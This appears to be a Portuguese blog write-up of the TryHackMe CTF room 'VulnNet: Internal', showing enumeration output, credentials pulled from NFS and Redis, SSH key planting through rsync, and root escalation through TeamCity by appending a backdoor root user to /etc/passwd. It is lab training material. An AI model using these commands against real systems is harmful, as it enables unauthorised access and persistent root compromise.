---
description: CTF do TryhackME como fiz e anotações.
title: TryhackMe - VulnNet Internal - Médio
date: 2024-02-21 04:07:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, linux, nfs, medio, rsync, redis]     # TAG names should always be lowercase
show_image_post: true
---

![Logo](/assets/img//internal/internal.png){: w="100" h="100" .left}

---
# **CTF - VulnNet: Internal**
---
---  
## **Enumeração**

### nmap

```shell
╰─ sudo nmap -Pn -sS -sV --min-rate 5000 -stats-every 7s -p- 10.10.141.166 -oN nmap
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-18 19:38 -03
NSE Timing: About 43.18% done; ETC: 19:39 (0:00:00 remaining)
Nmap scan report for 10.10.141.166
Host is up (0.37s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp   open     rpcbind     2-4 (RPC #100000)
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs_acl     3 (RPC #100227)
6379/tcp  open     redis       Redis key-value store
9090/tcp  filtered zeus-admin
35877/tcp open     nlockmgr    1-4 (RPC #100021)
37423/tcp open     mountd      1-3 (RPC #100005)
40185/tcp open     mountd      1-3 (RPC #100005)
45491/tcp open     java-rmi    Java RMI
53861/tcp open     mountd      1-3 (RPC #100005)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.79 seconds
```
{: .nolineno }

### crackmapexec
Enumeração usuários e compartilhamentos
```shell
╰─ crackmapexec smb 10.10.141.166 -u 'anonymous' -p '' --shares --users
SMB         10.10.141.166   445    VULNNET-INTERNAL [*] Windows 6.1 (name:VULNNET-INTERNAL) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.141.166   445    VULNNET-INTERNAL [+] \anonymous: 
SMB         10.10.141.166   445    VULNNET-INTERNAL [+] Enumerated shares
SMB         10.10.141.166   445    VULNNET-INTERNAL Share           Permissions     Remark
SMB         10.10.141.166   445    VULNNET-INTERNAL -----           -----------     ------
SMB         10.10.141.166   445    VULNNET-INTERNAL print$                          Printer Drivers
SMB         10.10.141.166   445    VULNNET-INTERNAL shares          READ            VulnNet Business Shares
SMB         10.10.141.166   445    VULNNET-INTERNAL IPC$                            IPC Service (vulnnet-internal server (Samba, Ubuntu))
SMB         10.10.141.166   445    VULNNET-INTERNAL [-] Error enumerating domain users using dc ip 10.10.141.166: socket connection error while opening: [Errno 111] Connection refused
SMB         10.10.141.166   445    VULNNET-INTERNAL [*] Trying with SAMRPC protocol
SMB         10.10.141.166   445    VULNNET-INTERNAL [+] Enumerated domain user(s)
SMB         10.10.141.166   445    VULNNET-INTERNAL [+] Enumerated domain user(s)
```
{: .nolineno }

Explorando pasta shares via smb 

```shell
╰─ smbclient //10.10.141.166/shares -U anonymous                      
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 06:20:09 2021
  ..                                  D        0  Tue Feb  2 06:28:11 2021
  temp                                D        0  Sat Feb  6 08:45:10 2021
  data                                D        0  Tue Feb  2 06:27:33 2021


╰─ cat business-req.txt 
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.

╰─ cat data.txt                
Purge regularly data that is not needed anymore
```
{: .nolineno }

### Primeira Flag
![alt text](/assets/img/internal/internal1.png)

### nfs porta 2049
Listando e montando nfs
```shell

╭─      ~/thm/vulnNetinternal           
╰─ showmount -e 10.10.141.166                                                         
Export list for 10.10.141.166:
/opt/conf *

╰─ sudo mount -t nfs 10.10.141.166: tmp
╭─      ~/thm/vulnNetinternal                         
╰─ tree tmp 
tmp
└── opt
    └── conf
        ├── hp
        │   └── hplip.conf
        ├── init
        │   ├── anacron.conf
        │   ├── lightdm.conf
        │   └── whoopsie.conf
        ├── opt
        ├── profile.d
        │   ├── bash_completion.sh
        │   ├── cedilla-portuguese.sh
        │   ├── input-method-config.sh
        │   └── vte-2.91.sh
        ├── redis
        │   └── redis.conf
        ├── vim
        │   ├── vimrc
        │   └── vimrc.tiny
        └── wildmidi
            └── wildmidi.cfg

10 directories, 12 files
```
{: .nolineno }
Pesquisando por palavra pass nos arquivos  
`find tmp -type f -exec grep -H 'pass' {} +`  
![alt text](/assets/img/internal/internal2.png)
requirepass "B65Hx562F@ggAZ@F"


### Conectando no redis porta 6379
`KEYS *`
```shell
╰─ redis-cli -h 10.10.141.166 -a B65Hx562F@ggAZ@F
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.141.166:6379> help
redis-cli 7.0.15
To get help about Redis commands type:
      "help @<group>" to get a list of commands in <group>
      "help <command>" for help on <command>
      "help <tab>" to get a list of possible help topics
      "quit" to exit

10.10.141.166:6379> KEYS *
1) "tmp"
2) "marketlist"
3) "authlist"
4) "internal flag"
5) "int"
```
{: .nolineno }
### Segunda Flag
`get "internal flag"`  

![alt text](/assets/img/internal/internal3.png)

```shell
10.10.141.166:6379> LRANGE authlist 1 1000
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```
{: .nolineno }
Aparentemente base64  
Credenciais rsync
![alt text](/assets/img/internal/internal4.png)
### Conectando no rsync

```shell
╭─      ~/thm/vulnNetinternal        
╰─ rsync --list-only rsync://10.10.141.166
files           Necessary home interaction
╭─      ~/thm/vulnNetinternal    
╰─ rsync --list-only rsync://rsync-connect@10.10.141.166/files
Password: 
drwxr-xr-x          4,096 2021/02/01 09:51:14 .
drwxr-xr-x          4,096 2021/02/06 09:49:29 sys-internal
╰─ rsync --list-only rsync://rsync-connect@10.10.141.166/files/sys-internal/
Password: 
drwxr-xr-x          4,096 2021/02/06 09:49:29 .
-rw-------             61 2021/02/06 09:49:28 .Xauthority
lrwxrwxrwx              9 2021/02/01 10:33:19 .bash_history
-rw-r--r--            220 2021/02/01 09:51:14 .bash_logout
-rw-r--r--          3,771 2021/02/01 09:51:14 .bashrc
-rw-r--r--             26 2021/02/01 09:53:18 .dmrc
-rw-r--r--            807 2021/02/01 09:51:14 .profile
lrwxrwxrwx              9 2021/02/02 11:12:29 .rediscli_history
-rw-r--r--              0 2021/02/01 09:54:03 .sudo_as_admin_successful
-rw-r--r--             14 2018/02/12 17:09:01 .xscreensaver
-rw-------          2,546 2021/02/06 09:49:35 .xsession-errors
-rw-------          2,546 2021/02/06 08:40:13 .xsession-errors.old
-rw-------             38 2021/02/06 08:54:25 user.txt
drwxrwxr-x          4,096 2021/02/02 06:23:00 .cache
drwxrwxr-x          4,096 2021/02/01 09:53:57 .config
drwx------          4,096 2021/02/01 09:53:19 .dbus
drwx------          4,096 2021/02/01 09:53:18 .gnupg
drwxrwxr-x          4,096 2021/02/01 09:53:22 .local
drwx------          4,096 2021/02/01 10:37:15 .mozilla
drwxrwxr-x          4,096 2021/02/06 08:43:14 .ssh
drwx------          4,096 2021/02/02 08:16:16 .thumbnails
drwx------          4,096 2021/02/01 09:53:21 Desktop
drwxr-xr-x          4,096 2021/02/01 09:53:22 Documents
drwxr-xr-x          4,096 2021/02/01 10:46:46 Downloads
drwxr-xr-x          4,096 2021/02/01 09:53:22 Music
drwxr-xr-x          4,096 2021/02/01 09:53:22 Pictures
drwxr-xr-x          4,096 2021/02/01 09:53:22 Public
drwxr-xr-x          4,096 2021/02/01 09:53:22 Templates
drwxr-xr-x          4,096 2021/02/01 09:53:22 Videos
```
{: .nolineno }

### Terceira Flag
Download do user.txt  
`rsync --progress rsync://rsync-connect@10.10.141.166/files/sys-internal/user.txt .`
![alt text](/assets/img/internal/internal5.png)
## **Acesso/Foothold**
É possível enviar chave ssh para .ssh do server via rsync

Gerando key ssh e adicionando ao servidor

```shell
─ ssh-keygen   
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): ssh
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ssh
Your public key has been saved in ssh.pub
The key fingerprint is:
SHA256:rFaOZsilZ+ZWo+HqrtTvNQlbo/7fWSMSfsur1lLYhec kali@kali
The keys randomart image is:
+--[ED25519 256]--+
|                 |
|                 |
|             .   |
|       .    . o  |
|      o S .o +   |
|   o +.Xo+..o E  |
|  . =.%+=.ooo o  |
| .   @+. .o=.= . |
|  .+++=..ooo*.   |
+----[SHA256]-----+
╭─      ~/thm/vulnNetinternal        
╰─ ls    
business-req.txt  data.txt  enum4lin.log  nmap  nmapsc  nmapudp  services.txt  ssh  ssh.pub  tmp  user.txt
╭─      ~/thm/vulnNetinternal        
╰─ rsync ssh.pub rsync://rsync-connect@10.10.141.166/files/sys-internal/.ssh/authorized_keys
Password: 
╭─      ~/thm/vulnNetinternal                       ✔  7s   
╰─ rsync rsync://rsync-connect@10.10.141.166/files/sys-internal/.ssh/ 

Password: 
drwxrwxr-x          4,096 2024/02/18 21:43:35 .
-rw-r--r--             91 2024/02/18 21:43:23 authorized_keys
```
{: .nolineno }
### Conectando via ssh

```shell
╭─      ~/thm/vulnNetinternal    
╰─ ssh sys-internal@10.10.141.166 -i ssh    
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sys-internal@vulnnet-internal:~$ 
```
{: .nolineno }
## **Exploração**
Listando / encontrado pasta `TeamCity`

```shell
sys-internal@vulnnet-internal:~$ ls -la /
total 533824
drwxr-xr-x  24 root root      4096 Feb  6  2021 .
drwxr-xr-x  24 root root      4096 Feb  6  2021 ..
drwxr-xr-x   2 root root      4096 Feb  2  2021 bin
drwxr-xr-x   3 root root      4096 Feb  1  2021 boot
drwx------   2 root root      4096 Feb  1  2021 .cache
drwxr-xr-x  17 root root      3720 Feb 18 23:30 dev
drwxr-xr-x 129 root root     12288 Feb  7  2021 etc
drwxr-xr-x   3 root root      4096 Feb  1  2021 home
lrwxrwxrwx   1 root root        34 Feb  1  2021 initrd.img -> boot/initrd.img-4.15.0-135-generic
lrwxrwxrwx   1 root root        33 Feb  1  2021 initrd.img.old -> boot/initrd.img-4.15.0-20-generic
drwxr-xr-x  18 root root      4096 Feb  1  2021 lib
drwxr-xr-x   2 root root      4096 Feb  1  2021 lib64
drwx------   2 root root     16384 Feb  1  2021 lost+found
drwxr-xr-x   4 root root      4096 Feb  2  2021 media
drwxr-xr-x   2 root root      4096 Feb  1  2021 mnt
drwxr-xr-x   4 root root      4096 Feb  2  2021 opt
dr-xr-xr-x 136 root root         0 Feb 18 23:30 proc
drwx------   8 root root      4096 Feb  6  2021 root
drwxr-xr-x  27 root root       880 Feb 19 01:48 run
drwxr-xr-x   2 root root      4096 Feb  2  2021 sbin
drwxr-xr-x   2 root root      4096 Feb  1  2021 srv
-rw-------   1 root root 546529280 Feb  1  2021 swapfile
dr-xr-xr-x  13 root root         0 Feb 18 23:30 sys
drwxr-xr-x  12 root root      4096 Feb  6  2021 TeamCity < -------------------
drwxrwxrwt  11 root root      4096 Feb 19 00:07 tmp
drwxr-xr-x  10 root root      4096 Feb  1  2021 usr
drwxr-xr-x  13 root root      4096 Feb  1  2021 var
lrwxrwxrwx   1 root root        31 Feb  1  2021 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root        30 Feb  1  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-20-generic
sys-internal@vulnnet-internal:~$ 
```
{: .nolineno }

```shell
sys-internal@vulnnet-internal:/TeamCity$ cat TeamCity-readme.txt 
This is the JetBrains TeamCity home directory.

To run the TeamCity server and agent using a console, execute:
* On Windows: `.\bin\runAll.bat start`
* On Linux and macOS: `./bin/runAll.sh start`

By default, TeamCity will run in your browser on `http://localhost:80/` (Windows) or `http://localhost:8111/` (Linux, macOS). If you cannot access the default URL, try these Troubleshooting tips: https://www.jetbrains.com/help/teamcity/installing-and-configuring-the-teamcity-server.html#Troubleshooting+TeamCity+Installation.

For evaluation purposes, we recommend running both server and agent. If you need to run only the TeamCity server, execute:
* On Windows: `.\bin\teamcity-server.bat start`
* On Linux and macOS: `./bin/teamcity-server.sh start`

For licensing information, see the "licenses" directory.

More information:
TeamCity documentation: https://www.jetbrains.com/help/teamcity/teamcity-documentation.html
TeamCity product page: https://www.jetbrains.com/teamcity/sys-internal@vulnnet-internal:/TeamCity$ 
```
{: .nolineno }

Checando se algo esta rodando na porta 8111

```shell
sys-internal@vulnnet-internal:/TeamCity/bin$ ss -ltp | grep 8111
LISTEN 0       100       [::ffff:127.0.0.1]:8111                        *:*  
```
{: .nolineno }
Arquivos logs verificados encontrado esses tokens

```shell
sys-internal@vulnnet-internal:/TeamCity/logs$ cat catalina.out | grep -i 'pass'
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 6504437154768240767 (use empty username with the token as the password to access the server)
```
{: .nolineno }

Fazendo port forward com ssh para acessar a aplicação web na porta 8111

```shell
╰─ ssh sys-internal@10.10.141.166 -i ssh -L 8111:localhost:8111
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_6
```
{: .nolineno }
## **Escalação de Privilégio para root**
Acesso feito com ultimo token.  
É possível executar comandos como root nessa aplicação. 
![alt text](/assets/img/internal/internal6.png)
 
Criando um projeto: 

![alt text](/assets/img/internal/internal7.png)

Cliquei em Build Configuration e preenchi o nome, no próximo passo de skip
![alt text](/assets/img/internal/internal8.png)

Escolhi adicionar um usuário no passwd via command line, pode fazer reverse shell, add o usuário sys-intenal no sudoers... etc

`echo 'pentest2:$6$z8cdUIDN1PCXgR/f$JZ3zd3Y45sd/RN6nDigDf.KZorSCLs9OgfuYnDWxOg0/tyCAOQrPC4LbNpLT8/USVe2O9y6KgXR4kOYzQQqZ61:0:0:root:/root:/bin/bash' >> /etc/passwd`

![alt text](/assets/img/internal/internal9.png)

Após a criação cliquei em run no canto direito superior.  
su pentest2 para logar com meu usuário criado.

```shell
sys-internal@vulnnet-internal:/TeamCity/logs$ su pentest2
Password: 
root@vulnnet-internal:/TeamCity/logs# 
```
{: .nolineno }
### Última Flag  

![alt text](/assets/img/internal/internal10.png)

**Conhecimentos adquiridos:**
- serviço nfs na porta 2049 e como montar
- uso de rsync 
- uso do redis
- port forward via ssh
- como abusar do TeamCity, encontrar logs etc